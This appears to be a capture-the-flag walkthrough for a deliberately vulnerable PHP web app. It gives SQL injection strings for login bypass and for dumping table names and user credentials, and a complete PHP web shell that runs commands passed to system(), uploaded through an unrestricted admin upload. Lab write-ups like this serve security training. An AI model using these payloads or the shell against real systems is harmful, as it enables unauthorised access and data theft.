# CTF Flags Documentation

## Flag 1: Admin Password Discovery

**Name**: Database Infiltration Flag
**Location**: Base64-encoded admin password in the users table
**Flag Format**: CTF{<admin-password-decoded>}

1. Initial SQL Injection Bypass
    1. Navigate to the login page
    2. Use SQL injection to bypass authentication:
        1. Username: ' OR 1=1 --
        2. Password: anything
    3. This logs you in as the first user in the database


2. Access Profile Page

    1. Navigate to index.php?page=profile
    2. Locate the "Share Your Experience" review section


3. Exploit SQL Injection in Review Update

    1. Use the review textarea to perform SQL injection via the updateReview() function
    2. First, discover database structure:
        ```sql
        sql', review_text=(SELECT GROUP_CONCAT(table_name SEPARATOR ', ') FROM information_schema.tables WHERE table_schema=database()) WHERE '1'='1' -- 
        ```


4. Extract User Table Columns

```sql
sql', review_text=(SELECT GROUP_CONCAT(column_name SEPARATOR ', ') FROM information_schema.columns WHERE table_name='users') WHERE '
1'='
1' --
```

5. Extract User Data

```sql
sql', review_text=(SELECT GROUP_CONCAT(CONCAT(username,':',password,':',role) SEPARATOR ', ') FROM users) WHERE '
1'='
1' --
```

6. Decode Admin Password
    1. Locate the admin user entry in the extracted data
    2. The password is stored as base64-encoded
    3. Decode the base64 string to reveal the flag

## Flag 2: File System Access

**Name**: Server File System Flag
**Location**: /flag.txt file on the server
**Flag** Format: CTF{<content-of-flag-txt>}

1. Obtain Admin Credentials
    1. Complete Flag 1 exploit to get admin username and decoded password
2. Login as Administrator
    1. Use the admin credentials to log in properly as admin user
3. Access File Upload Functionality
    1. As an admin user, the profile page shows file upload capability
    2. The upload function in handleFileUpload() has no file type restrictions for admins
4. Create PHP Web Shell
    1. Create a PHP file with web shell functionality:
   ```html
   <html>
    <body>
    <form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
    <input type="text" name="command" autofocus id="command" size="50">
    <input type="submit" value="Execute">
    </form>
    <pre>
    <?php
        if(isset($_GET['command'])) 
        {
            system($_GET['command'] . ' 2>&1'); 
        }
    ?>
    </pre>
    </body>
    </html>
    ```
   2. Save as shell.png.php
5. Upload Web Shell
   1. Use the profile image upload feature to upload shell.php
   2. The file will be stored in the /uploads/ directory
6. Access Web Shell
   1. Navigate to /uploads/shell.php
   2. Use the command interface to explore the file system
7. Locate and Read Flag
   1. Execute ls or dir to list files in the current directory
   2. Look for flag.txt

## Flag 3: Buffer Overflow
